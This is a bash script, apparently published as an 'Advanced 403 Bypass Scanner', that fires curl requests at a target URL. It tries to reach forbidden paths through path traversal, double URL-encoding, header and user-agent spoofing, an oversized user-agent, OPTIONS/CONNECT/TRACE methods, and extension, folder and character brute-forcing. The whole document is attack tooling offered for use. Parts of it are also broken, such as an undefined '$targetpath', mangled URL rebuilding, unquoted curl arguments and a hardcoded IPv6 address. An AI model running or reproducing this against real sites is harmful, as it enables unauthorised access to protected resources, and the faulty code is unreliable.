#!/bin/bash

# Colorful output

red=$(tput setaf 1)

green=$(tput setaf 2)

reset=$(tput sgr0)

echo "${green}Advanced 403 Bypass Scanner${reset}"

echo "${green}|*****************************|${reset}"
echo "${green}|                             |${reset}"
echo "${green}|      MADE BY X-3306         |${reset}"
echo "${green}| https://github.com/X-3306   |${reset}"
echo "${green}|     YT: X-3306 / vnv2834    |${reset}"
echo "${green}|                             |${reset}"
echo "${green}|*****************************|${reset}"

# Argument check

if [ $# -ne 2 ]; then

echo "Usage: $0 <url> <path>"

exit 1

fi

url="$1"

path="$2"

# Bypass testing function

test_bypass() {

method="$1"

attempt="$2"

curl -sS -o /dev/null -w "%{http_code}" $attempt > /dev/null

status=$(curl -sS -o /dev/null -w "%{http_code}" $attempt)

if [ $status -eq 200 ]; then

echo "${green}[+] Success! Bypass using $method: $attempt${reset}"

else

echo "${red}[-] Failed $method: $attempt${reset}"

fi

}

# Bypass attempts

test_bypass "DIRECT" "$url/$path"

test_bypass "DOUBLE URLENCODE" "$url/%252525../$path"

test_bypass "URL PATH MANIPULATION" "$url/../$path"

test_bypass "ADDING DOT" "$url/$path/."

test_bypass "ADDING QUERY" "$url/$path?param=1"


test_bypass "IP ADDRESS" "http://127.0.0.1/$path"


agents=( "Mozilla/5.0" "curl/7.68.0" "Apache-HttpClient/4.5.13" )

agent=${agents[$RANDOM % ${#agents[@]} ]}

test_bypass "USER AGENT" "-A '$agent' $url/$path"

# Bypass by sending OPTIONS and not GET

test_bypass "HTTP METHOD" "-X OPTIONS $url/$path"


parts=(${url//\// })

attempt="${parts[3]}://${parts[2]}.${parts[1]}.${parts[0]}/${targetpath}"

test_bypass "REKORD URL" $attempt


attempt="$url/${targetpath}/../${targetpath}//${targetpath}/./${targetpath}"

test_bypass "NESTED PATHS" $attempt

# Bypass by using ip6 no ip4

test_bypass "IPv6 ADDRESS" "http://[2606:2800:220:1:248:1893:25c8:1946]/$path"

# Bypass

test_bypass "CASE MANIPULATION" "$url/$(echo $path | tr '[:lower:]' '[:upper:]')"

# Bypass with CONNECT tunneling

test_bypass "CONNECT TUNNEL" "-X CONNECT $url:443 HTTP/1.1"

# Bypass by adding random characters to path

chars="/_*$,;"

path="${path}${chars:$((RANDOM%${#chars})):1}"

test_bypass "RANDOM SPECIAL CHARS" "$url/$path"

# Bypass by brute-force file extensions

for ext in htm html php json xml txt; do

attempt="$url/${path}.$ext"

test_bypass "BRUTEFORCE EXT" $attempt

done

# Bypass by User-Agent headers

test_bypass "OVERFLOW USER-AGENT" '-A "X$(yes X | head -c 5000)"' "$url/$path"

# Brute-force folders and files

for i in {1..10}; do

dir="folder$i"

test_bypass "BRUTEFORCE FOLDER" "$url/$dir/$path"

file="file$i.txt"

test_bypass "BRUTEFORCE FILE" "$url/$path/$file"

done

# Fuzzing 

chars='|"\\><&?'

for c in $chars; do

test_bypass "FUZZ SPECIAL CHARS" "$url/$path$c"

done

# Fuzzing path

for i in {1..10}; do

frag=${path:i:5}

test_bypass "FUZZ PATH FRAGMENT" "$url/$frag"

done

# Fuzzing GET param

for i in {1..10}; do

param="fuzz$i=value$i"

test_bypass "FUZZING PARAMS" "$url/$path?$param"

done


curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo " --> ${1}/${2} -X TRACE"



# Fetch previous paths from Wayback Machine


echo "Way back machine:"

curl -s https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'

# Examine response headers

echo -e "\n${green}Inspecting response headers:${reset}"

curl -I -sL $url/$path | grep -i -E 'location|uri'

echo -e "\nScan completed!"